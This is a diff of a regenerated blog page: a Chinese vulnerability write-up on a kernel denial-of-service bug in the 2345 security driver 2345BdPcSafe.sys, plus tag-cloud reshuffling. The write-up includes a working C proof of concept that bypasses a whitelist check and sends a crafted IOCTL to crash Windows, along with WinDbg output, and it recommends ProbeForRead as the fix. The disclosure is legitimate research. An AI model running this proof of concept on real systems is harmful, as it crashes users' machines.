@@ -15,8 +15,9 @@
 <meta property="og:url" content="https://anhkgg.github.io/vul-2345-2/index.html">
 <meta property="og:site_name" content="Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘">
 <meta property="og:description" content="漏洞概述 软件网址：http://safe.2345.cc/ 版本：v3.7 X64  2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006mu4nKly1ft28yb8ym6j30mu03p747.jpg">
-<meta property="og:updated_time" content="2018-07-08T03:18:23.918Z">
+<meta property="og:updated_time" content="2018-07-08T03:18:23.919Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2345内核拒绝服务漏洞（2）">
 <meta name="twitter:description" content="漏洞概述 软件网址：http://safe.2345.cc/ 版本：v3.7 X64  2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。">
@@ -182,7 +183,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul>
-<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="external">http://safe.2345.cc/</a></li>
+<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
 <li>版本：v3.7 X64</li>
 </ul>
 <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p>
@@ -193,9 +194,9 @@
 <p>问题就出在这里，<code>MmIsAddressValid</code>并不能验证一个内存某范围内是否可读可写，仅仅只能验证该地址读写是否会触发一个页错误。</p>
 <p>所以我们就可以构造一个可通过<code>MmIsAddressValid</code>验证并且地址16偏移不可读的内存作为输入，造成bsod。</p>
 <p>看下面的poc代码，通过<code>VirtualAlloc</code>分配一个页大小的内存，可读可写，然后计算页地址尾地址-4作为输入缓存的ptr，这样<code>MmIsAddressValid</code>可通过校验，再内核读取ptr+16偏移时地址已经超过该页内存范围，不可访问，导致bsod。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">int poc()</div><div class="line">&#123;</div><div class="line">	</div><div class="line">	DWORD BytesReturned = 0;</div><div class="line"></div><div class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</div><div class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">    //过白名单检查</div><div class="line">	if (!BypassChk(h)) &#123;</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	//BSOD</div><div class="line">	DWORD ctlcode = 0x2220E4;</div><div class="line">#pragma pack(push,1)</div><div class="line">	struct _ioctl_buf_in</div><div class="line">	&#123;</div><div class="line">		 __int64 ptr;</div><div class="line">	&#125;;</div><div class="line">#pragma pack(pop)</div><div class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</div><div class="line">    </div><div class="line">    //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr</div><div class="line">    //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod</div><div class="line">	PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);</div><div class="line">	memset(ptr, 0x41, 0x1000);//</div><div class="line">	buff.ptr = (__int64)ptr + 0x1000 - 0x4;</div><div class="line"></div><div class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, sizeof(_ioctl_buf_in), &amp;BytesReturned, NULL)) &#123;</div><div class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line">	if (!BypassChk(h)) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//BSOD</span><br><span class="line">	DWORD ctlcode = 0x2220E4;</span><br><span class="line">#pragma pack(push,1)</span><br><span class="line">	struct _ioctl_buf_in</span><br><span class="line">	&#123;</span><br><span class="line">		 __int64 ptr;</span><br><span class="line">	&#125;;</span><br><span class="line">#pragma pack(pop)</span><br><span class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">    </span><br><span class="line">    //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr</span><br><span class="line">    //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod</span><br><span class="line">	PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	memset(ptr, 0x41, 0x1000);//</span><br><span class="line">	buff.ptr = (__int64)ptr + 0x1000 - 0x4;</span><br><span class="line"></span><br><span class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, sizeof(_ioctl_buf_in), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>看看内存更加清晰，<code>buff</code>地址是<code>003efea0</code>，<code>buff.ptr</code>的值是<code>00030ffc</code>，可以清楚看到<code>00030ffc</code>+16偏移处肯定是不可读的了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0: kd:x86&gt; dd 003efe3c </div><div class="line">00000000`003efe3c  003efe68 75db3237 00000030 002220e4</div><div class="line">00000000`003efe4c  003efea0 00000008 003efea0 00000008</div><div class="line">0: kd:x86&gt; dd 003efea0 </div><div class="line">00000000`003efea0  00030ffc 00000000 01234808 003efef8</div><div class="line">0: kd:x86&gt; dd 00030ffc </div><div class="line">00000000`00030ffc  41414141 ???????? ???????? ????????</div><div class="line">00000000`0003100c  ???????? ???????? ???????? ????????</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd:x86&gt; dd 003efe3c </span><br><span class="line">00000000`003efe3c  003efe68 75db3237 00000030 002220e4</span><br><span class="line">00000000`003efe4c  003efea0 00000008 003efea0 00000008</span><br><span class="line">0: kd:x86&gt; dd 003efea0 </span><br><span class="line">00000000`003efea0  00030ffc 00000000 01234808 003efef8</span><br><span class="line">0: kd:x86&gt; dd 00030ffc </span><br><span class="line">00000000`00030ffc  41414141 ???????? ???????? ????????</span><br><span class="line">00000000`0003100c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
 <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞算是前一个的延申，依然是应用层传入内容中包括内存地址，也加入了内存合法性验证代码，但是却没什么用，并没有验证到要访问的内存处的合法性，这个疏漏导致了漏洞的产生。</p>
 <p>更好的验证内存合法性的函数应该使用<code>ProbeForRead(p, len, x)</code>，可以验证一个范围内内存的合法性，更加严谨，能更好的避免漏洞的产生。</p>
 <p>稍微总结一下，应用层传入内容结构越复杂，越容易出现问题。这个漏洞出现的位置，本来应该是2345接口协议验证的代码，是为了增加安全性的，却不想成为了安全性问题的原因。</p>
@@ -203,8 +204,8 @@
 <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-2/">https://anhkgg.github.io/vul-2345-2/</a></p>
 <p><strong>参考</strong></p>
 <ol>
-<li><a href="https://www.cnblogs.com/Ox9A82/p/5571217.html" target="_blank" rel="external">如何验证一个地址可否使用—— MmIsAddressValid函数分析</a></li>
-<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid</a></li>
+<li><a href="https://www.cnblogs.com/Ox9A82/p/5571217.html" target="_blank" rel="noopener">如何验证一个地址可否使用—— MmIsAddressValid函数分析</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid</a></li>
 </ol>
 
       
@@ -552,22 +553,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Anti-AntiVirus</a>
               </li>
              
@@ -581,6 +566,10 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">杀毒软件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -600,7 +589,15 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -613,6 +610,22 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">cookie</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -652,23 +665,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">IDAPro</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">IDC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -701,6 +702,34 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pyspider</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">http</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -744,30 +773,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">http</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">v2ex</a>
               </li>
              
@@ -776,7 +781,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -812,6 +821,18 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">vul</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">FireEye</a>
               </li>
              
@@ -821,6 +842,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">FINSPY</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">upx</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -837,26 +866,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">mmc.exe</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">vul</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">upx</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -892,14 +901,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">APC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">windbg</a>
               </li>
              
@@ -913,6 +914,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">win10</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">APC</a>
               </li>
             
             <div class="clearfix"></div>
